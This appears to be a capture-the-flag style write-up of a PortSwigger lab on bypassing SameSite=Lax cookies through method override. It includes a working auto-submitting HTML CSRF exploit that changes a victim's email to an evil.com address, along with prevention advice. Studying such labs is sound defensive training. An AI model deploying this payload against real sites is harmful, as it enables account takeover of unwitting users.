# Lab: SameSite Lax bypass via method override

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF) / SameSite Cookies  
**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

## 🎯 Objective
Bypass SameSite=Lax cookie restrictions using method override to perform a CSRF attack.

## 📖 Description
The session cookie has `SameSite=Lax` attribute. This normally blocks cross-site POST requests. However, the application accepts method override (e.g. via `_method` parameter), allowing us to turn a GET request into a POST.

## 🔍 Vulnerability Analysis

- **Cookie Attribute**: `SameSite=Lax`
- **Lax Behavior**: Allows GET requests from other sites, but blocks POST.
- **Bypass**: Use method override technique to make the server treat a GET request as POST.

## 🛠️ How to Solve (Step by Step)

1. Log in and observe the session cookie has `SameSite=Lax`.
2. Capture a normal email change request (`POST`).
3. Convert it to a `GET` request and add a method override parameter (commonly `_method=POST` or `method=POST`).
4. Test in Burp Repeater.
5. Build the final exploit.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SameSite Lax Bypass - Method Override</title>
</head>
<body>
    <h1>Processing request...</h1>
    
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="_method" value="POST">   <!-- Method Override -->
        <!-- Add csrf token if required -->
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery
Upload to Exploit Server → Deliver exploit to victim.

⚡ Impact

SameSite=Lax can be bypassed for state-changing operations if the application supports method overriding.
Common in frameworks like Rails, Laravel, etc.

🛡️ Prevention

Use SameSite=Strict where possible.
Do not allow method overriding on sensitive endpoints.
Validate the actual HTTP method on the server side.
Combine with strong CSRF tokens.

🔬 Key Learning Points

SameSite=Lax is not a complete CSRF defense.
Method override parameters can break SameSite restrictions.
Always verify the real request method on the backend.
